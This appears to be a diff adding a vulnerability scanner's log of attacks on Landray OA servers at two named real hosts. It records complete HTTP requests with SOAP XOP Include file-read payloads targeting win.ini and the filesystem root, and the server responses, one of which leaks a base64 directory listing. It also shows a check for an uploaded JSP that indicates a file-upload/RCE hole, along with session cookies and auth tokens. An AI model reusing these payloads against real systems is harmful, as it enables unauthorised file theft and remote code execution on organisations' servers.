@@ -1,0 +1,214 @@
+http://erp.checrc.com:9081               🤓 landray
+http://122.233.90.58:9081                🤓 landray
+[vuln] [high] [lanling-oa-sysFormMainDataInsystemWebservice-fileread] [landray, lfi, landray-eis] http://erp.checrc.com:9081/sys/webservice/sysFormMainDataInsystemWebservice
+================  请求数据包 ================
+POST /sys/webservice/sysFormMainDataInsystemWebservice HTTP/1.1
+Host: erp.checrc.com:9081
+User-Agent: Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 567
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/related; boundary=----obauz4ivws9hx4uqri1l
+SOAPAction: ""
+
+------obauz4ivws9hx4uqri1l
+Content-Disposition: form-data; name="a"
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.maindata.xform.sys.kmss.landray.com/">
+<soapenv:Header/>
+<soapenv:Body>
+    <web:getData>
+        <arg0>
+            <beginTimeStamp>a</beginTimeStamp>
+            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+        </arg0>
+    </web:getData>
+</soapenv:Body>
+</soapenv:Envelope>
+------obauz4ivws9hx4uqri1l--
+
+================  请求响应包 ================
+HTTP/1.1 500 
+Connection: close
+Content-Length: 289
+Access-Control-Allow-Origin: *
+Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'
+Content-Type: text/xml;charset=UTF-8
+Date: Mon, 30 Mar 2026 06:02:35 GMT
+Set-Cookie: SESSION=NTRiMjE1MDktZDgxYi00OGQ2LWE1YWQtZmJiNDM4MmJiYzYz; Path=/; HttpOnly; SameSite=Lax
+X-Auth-Token: 54b21509-d81b-48d6-a5ad-fbb4382bbc63
+X-Xss-Protection: 0
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Client</faultcode><faultstring>Unmarshalling Error: 意外的元素 (uri:"", local:"beginTimeStamp")。所需元素为(none) </faultstring></soap:Fault></soap:Body></soap:Envelope>
+============================================
+[vuln] [high] [lanling-oa-sysFormMainDataInsystemWebservice-fileread] [landray, lfi, landray-eis] http://122.233.90.58:9081/sys/webservice/sysFormMainDataInsystemWebservice
+================  请求数据包 ================
+POST /sys/webservice/sysFormMainDataInsystemWebservice HTTP/1.1
+Host: 122.233.90.58:9081
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 567
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/related; boundary=----ygdgrtbuoppdkfo6cebj
+SOAPAction: ""
+
+------ygdgrtbuoppdkfo6cebj
+Content-Disposition: form-data; name="a"
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.maindata.xform.sys.kmss.landray.com/">
+<soapenv:Header/>
+<soapenv:Body>
+    <web:getData>
+        <arg0>
+            <beginTimeStamp>a</beginTimeStamp>
+            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+        </arg0>
+    </web:getData>
+</soapenv:Body>
+</soapenv:Envelope>
+------ygdgrtbuoppdkfo6cebj--
+
+================  请求响应包 ================
+HTTP/1.1 500 
+Connection: close
+Content-Length: 289
+Access-Control-Allow-Origin: *
+Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'
+Content-Type: text/xml;charset=UTF-8
+Date: Mon, 30 Mar 2026 06:02:35 GMT
+Set-Cookie: SESSION=MDRjZjY0OTEtODQyMi00ZTYxLTgxOWUtMDZkMzE4OTM0Yzli; Path=/; HttpOnly; SameSite=Lax
+X-Auth-Token: 04cf6491-8422-4e61-819e-06d318934c9b
+X-Xss-Protection: 0
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Client</faultcode><faultstring>Unmarshalling Error: 意外的元素 (uri:"", local:"beginTimeStamp")。所需元素为(none) </faultstring></soap:Fault></soap:Body></soap:Envelope>
+============================================
+[vuln] [high] [lanling-oa-thirdImSyncForKKWebService-fileread] [landray, lfi, landray-eis] http://erp.checrc.com:9081/sys/webservice/thirdImSyncForKKWebService
+================  请求数据包 ================
+POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1
+Host: erp.checrc.com:9081
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 546
+Content-Type: multipart/related; boundary=----giaqvuo7rcvwvy7hkgpw
+SOAPAction: ""
+Accept-Encoding: gzip
+
+------giaqvuo7rcvwvy7hkgpw
+Content-Disposition: form-data; name="a"
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
+<soapenv:Header/>
+<soapenv:Body>
+<web:getTodo>
+<arg0>
+<otherCond>1</otherCond>
+<pageNo>1</pageNo>
+<rowSize>1</rowSize>
+<targets>1</targets>
+<type><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///"/></type>
+</arg0>
+</web:getTodo>
+</soapenv:Body>
+</soapenv:Envelope>
+------giaqvuo7rcvwvy7hkgpw--
+
+================  请求响应包 ================
+HTTP/1.1 500 
+Connection: close
+Content-Length: 679
+Access-Control-Allow-Origin: *
+Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'
+Content-Type: text/xml;charset=UTF-8
+Date: Mon, 30 Mar 2026 06:02:35 GMT
+Set-Cookie: SESSION=YWNiNDZhZjItODhiYS00ZDA1LTk0MzgtOTNjZGE4M2E0ZWE3; Path=/; HttpOnly; SameSite=Lax
+X-Auth-Token: acb46af2-88ba-4d05-9438-93cda83a4ea7
+X-Xss-Protection: 0
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Client</faultcode><faultstring>Unmarshalling Error: Not a number: JFJFQ1lDTEUuQklOCmFwcApjbl9zcWxfc2VydmVyXzIwMDhfcjJfc3RhbmRhcmRfeDg2X3g2NF9pYTY0X2R2ZF81MjIyMzkKZGF0YWJhc2VfYmFrX2RheQpkYXRhYmFzZV9iYWtfeXVlCmRhdGFlYXNlLW9mZmxpbmUtaW5zdGFsbGVyLXYyLjEwLjYtY2UudGFyLmd6CkR1bXBTdGFjay5sb2cudG1wCmVrcApraW5nZGVlLWJhawpsYW5kcmF5Cm15c3FsCnJlc291cmNlClN1bmxvZ2luQ2xpZW50XyAxNS4zLjIuNjI5MTlfeDY0LmV4ZQpTeW5jQmFja1BybyB2MTEuMi56aXAKU3lzdGVtIFZvbHVtZSBJbmZvcm1hdGlvbgrK17TOvfi0xcXMz8i/tLG+zsS8/i3W2NKqzOHKvi50eHQKzsS8/rD8Cg== </faultstring></soap:Fault></soap:Body></soap:Envelope>
+============================================
+[vuln] [high] [lanling-oa-thirdImSyncForKKWebService-fileread] [landray, lfi, landray-eis] http://122.233.90.58:9081/sys/webservice/thirdImSyncForKKWebService
+================  请求数据包 ================
+POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1
+Host: 122.233.90.58:9081
+User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 546
+Content-Type: multipart/related; boundary=----2wqv1zk8v6c9ueoc3tp6
+SOAPAction: ""
+Accept-Encoding: gzip
+
+------2wqv1zk8v6c9ueoc3tp6
+Content-Disposition: form-data; name="a"
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
+<soapenv:Header/>
+<soapenv:Body>
+<web:getTodo>
+<arg0>
+<otherCond>1</otherCond>
+<pageNo>1</pageNo>
+<rowSize>1</rowSize>
+<targets>1</targets>
+<type><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///"/></type>
+</arg0>
+</web:getTodo>
+</soapenv:Body>
+</soapenv:Envelope>
+------2wqv1zk8v6c9ueoc3tp6--
+
+================  请求响应包 ================
+HTTP/1.1 500 
+Connection: close
+Content-Length: 679
+Access-Control-Allow-Origin: *
+Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'
+Content-Type: text/xml;charset=UTF-8
+Date: Mon, 30 Mar 2026 06:02:35 GMT
+Set-Cookie: SESSION=NTVmNjI4ZjYtYjU5OS00ZTY0LWIwYzEtOThhZmZiNTk3N2Iw; Path=/; HttpOnly; SameSite=Lax
+X-Auth-Token: 55f628f6-b599-4e64-b0c1-98affb5977b0
+X-Xss-Protection: 0
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Client</faultcode><faultstring>Unmarshalling Error: Not a number: JFJFQ1lDTEUuQklOCmFwcApjbl9zcWxfc2VydmVyXzIwMDhfcjJfc3RhbmRhcmRfeDg2X3g2NF9pYTY0X2R2ZF81MjIyMzkKZGF0YWJhc2VfYmFrX2RheQpkYXRhYmFzZV9iYWtfeXVlCmRhdGFlYXNlLW9mZmxpbmUtaW5zdGFsbGVyLXYyLjEwLjYtY2UudGFyLmd6CkR1bXBTdGFjay5sb2cudG1wCmVrcApraW5nZGVlLWJhawpsYW5kcmF5Cm15c3FsCnJlc291cmNlClN1bmxvZ2luQ2xpZW50XyAxNS4zLjIuNjI5MTlfeDY0LmV4ZQpTeW5jQmFja1BybyB2MTEuMi56aXAKU3lzdGVtIFZvbHVtZSBJbmZvcm1hdGlvbgrK17TOvfi0xcXMz8i/tLG+zsS8/i3W2NKqzOHKvi50eHQKzsS8/rD8Cg== </faultstring></soap:Fault></soap:Body></soap:Envelope>
+============================================
+[vuln] [critical] [landary-oa-sysuicomponent-fileupload] [landray, oa, treexml, rce, vuln] http://erp.checrc.com:9081/resource/ui-component/2023/timestamps.jsp
+================  请求数据包 ================
+GET /resource/ui-component/2023/timestamps.jsp HTTP/1.1
+Host: erp.checrc.com:9081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Connection: close
+Cookie: SESSION=YTllODA3MzMtZGQ2ZC00YTdiLWE4YjMtMDZmMmJjZTBjOGZh
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Content-Length: 8
+Access-Control-Allow-Origin: *
+Content-Type: text/html;charset=ISO-8859-1
+Date: Mon, 30 Mar 2026 06:02:35 GMT
+
+400841
+
+============================================
+[vuln] [critical] [landary-oa-sysuicomponent-fileupload] [landray, oa, treexml, rce, vuln] http://122.233.90.58:9081/resource/ui-component/2023/timestamps.jsp
+================  请求数据包 ================
+GET /resource/ui-component/2023/timestamps.jsp HTTP/1.1
+Host: 122.233.90.58:9081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Connection: close
+Cookie: SESSION=YWM4YzgyNTktZGNjMy00N2UxLTkwMmMtNzNlMTQ3OGY1NjM5
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Content-Length: 8
+Access-Control-Allow-Origin: *
+Content-Type: text/html;charset=ISO-8859-1
+Date: Mon, 30 Mar 2026 06:02:35 GMT
+
+400841
+
+============================================
